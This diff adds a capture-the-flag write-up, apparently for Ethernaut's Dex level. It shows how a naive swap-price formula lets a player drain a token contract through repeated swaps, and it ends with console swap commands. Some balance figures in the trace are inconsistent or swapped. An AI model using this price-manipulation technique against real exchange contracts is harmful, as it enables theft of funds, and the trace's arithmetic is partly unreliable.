@@ -1,0 +1,113 @@
+------------------
+NOTES
+------------------
+
+LEVEL 22: Dex
+------------------
+
+Vulnerability - Poor Token Price Mechanism
+- The swap price per token is calculated with this algorithm:
+
+	(amount * this contract's balance of token swapped to) / (this contract's balance of token swapped from)
+
+	- Therefore if the contract's balance of some token were to be drained to 0,
+		there would be a math error
+	- Furthermore, this leads to an arbitrage opportunity where if an attack
+		continuously transfers their entire balance of each token, the price of
+		the contract will grant the user increasingly more token in return
+	- Inspect the following sceneario:
+
+		Starting sceneario
+		------------------------------------
+		Player balance of token1 										: 10
+		Player balance of token2 										: 10
+		Contract balance of token1 									: 100
+		Contract balance of token2 									: 100
+		Price of player swapping token1 for token2 	: (10 * 100) / (100) = 10
+		Sum tokens player can get from swap 				: 20
+		Price of player swapping token2 for token1 	: (10 * 100) / (100) = 10
+		Sum tokens player can get from swap 				: 20
+
+		Player transfers all of token1
+		------------------------------------
+		Player balance of token1 										: 0
+		Player balance of token2 										: 20
+		Contract balance of token1 									: 110
+		Contract balance of token2 									: 90
+		Price of player swapping token1 for token2 	: (0 * 90) / (110) = 0
+		Sum tokens player can get from swap 				: 0
+		Price of player swapping token2 for token1 	: (20 * 110) / (90) = 24.4444
+		Sum tokens player can get from swap 				: 24
+
+		- Look! here we found a trade where the player gains an additional 4
+			tokens!
+
+		Player transfers all of token2
+		------------------------------------
+		Player balance of token1 										: 24
+		Player balance of token2 										: 0
+		Contract balance of token1 									: 86
+		Contract balance of token2 									: 110
+		Price of player swapping token1 for token2 	: (24 * 110) / (86) = 30.6976...
+		Sum tokens player can get from swap 				: 30
+		Price of player swapping token2 for token1 	: (0 * 86) / (110) = 0
+		Sum tokens player can get from swap 				: 0
+
+		- If we keep repeating this process, we can get more and more total
+			tokens... what if we repeat this process a couple more times?
+
+		Player transfers all of token1
+		------------------------------------
+		Player balance of token1 										: 0
+		Player balance of token2 										: 30
+		Contract balance of token1 									: 110
+		Contract balance of token2 									: 80
+		Price of player swapping token2 for token1 	: (30 * 110) / (80) = 41.25
+		Sum tokens player can get from swap 				: 41
+
+		Player transfers all of token2
+		------------------------------------
+		Player balance of token1 										: 41
+		Player balance of token2 										: 0
+		Contract balance of token1 									: 69
+		Contract balance of token2 									: 110
+		Price of player swapping token1 for token2 	: (41 * 110) / (69) = 65.36
+		Sum tokens player can get from swap 				: 41
+
+		Player transfers all of token1
+		------------------------------------
+		Player balance of token1 										: 0
+		Player balance of token2 										: 65
+		Contract balance of token1 									: 110
+		Contract balance of token2 									: 45
+		Price of player swapping token2 for token1 	: (65 * 110) / (45) = 158.8888
+		Sum tokens player can get from swap 				: More than the contract can supply?
+
+		- Note, at this point, a full swap is impossible as the contract can't
+			supply a trade, however, we can still drain all of its funds... >:^)
+
+		Player transfers 45 of token2
+		------------------------------------
+		Player balance of token1 										: 110
+		Player balance of token2 										: 20
+		Contract balance of token1 									: 90
+		Contract balance of token2 									: 0
+
+		- And with this, we can successfully drain the contract of all of token2
+			causing us to get rich!
+
+Exploitation
+ - The exploitation phase is merely just repeating trades until the contract
+	 is drained, for your convience I've added them here :)
+
+		// First we need to approve the dex to make any transactions
+		await contract.approve(instance, 100000)
+		// Then we can start making swaps
+		await contract.swap(await contract.token2(), await contract.token1(),10)
+		await contract.swap(await contract.token1(), await contract.token2(),20)
+		await contract.swap(await contract.token2(), await contract.token1(),24)
+		await contract.swap(await contract.token1(), await contract.token2(),30)
+		await contract.swap(await contract.token2(), await contract.token1(),41)
+		await contract.swap(await contract.token1(), await contract.token2(),45)
+
+		- Now submit your instance :)
